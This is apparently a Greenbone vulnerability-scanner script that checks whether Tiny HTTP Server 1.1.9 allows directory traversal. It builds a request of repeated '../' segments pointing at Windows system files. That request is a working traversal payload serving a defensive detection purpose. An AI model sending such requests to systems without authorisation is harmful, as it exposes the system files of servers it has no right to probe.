# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805030");
  script_version("2023-07-26T05:05:09+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-12-11 11:55:21 +0530 (Thu, 11 Dec 2014)");
  script_name("Tiny HTTP Server Arbitrary File Disclosure Vulnerability");

  script_tag(name:"summary", value:"Tiny HTTP server is prone to arbitrary file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to system files.");

  script_tag(name:"insight", value:"The flaw is due to an improper
  sanitation  of user input via HTTP requests using directory traversal
  attack (e.g., /../../../).");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers
  to perform directory traversal attacks and read arbitrary files on the affected
  application.");

  script_tag(name:"affected", value:"Tiny Server version 1.1.9");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35426");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TinyServer/banner");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");

tinyPort = http_get_port(default:80);

banner = http_get_remote_headers(port:tinyPort);
if("Server: TinyServer" >!< banner) exit(0);

## affected only on windows
files = traversal_files("windows");

foreach file (keys(files))
{
  url = "/" + crap(data:"../",length:15) + files[file];

  if(http_vuln_check(port:tinyPort, url:url, pattern:file))
  {
    security_message(port:tinyPort);
    exit(0);
  }
}

exit(99);
